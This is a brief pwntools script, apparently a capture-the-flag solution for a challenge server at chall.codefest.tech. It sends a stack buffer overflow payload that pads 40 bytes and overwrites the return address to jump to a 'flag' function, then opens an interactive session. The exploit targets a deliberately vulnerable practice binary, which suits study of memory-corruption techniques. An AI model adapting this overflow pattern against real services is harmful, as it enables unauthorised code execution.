from pwn import *

exe_file="./source_fixed"
server="chall.codefest.tech"
port="8780"
libc_file="/lib/x86_64-linux-gnu/libc.so.6"

exe = ELF(exe_file,0)
libc = ELF(libc_file,0) 

context.binary = exe
# context.terminal = []

def conn():
	if args.LOCAL:
		return process([exe.path])
	else:
		return remote(server,port)

def attach(r,gdbscript):
	if type(r) == process:
		gdb.attach(r,gdbscript)

def exploit():
	flag_func = p64(0x00000000004011b6)
	payload = "A"*0x20
	payload += "A"*0x8
	payload += flag_func
	r.recvuntil("function\n") 
	r.sendline(payload)
	

if __name__ == "__main__":
	r = conn()
	exploit()
	r.interactive()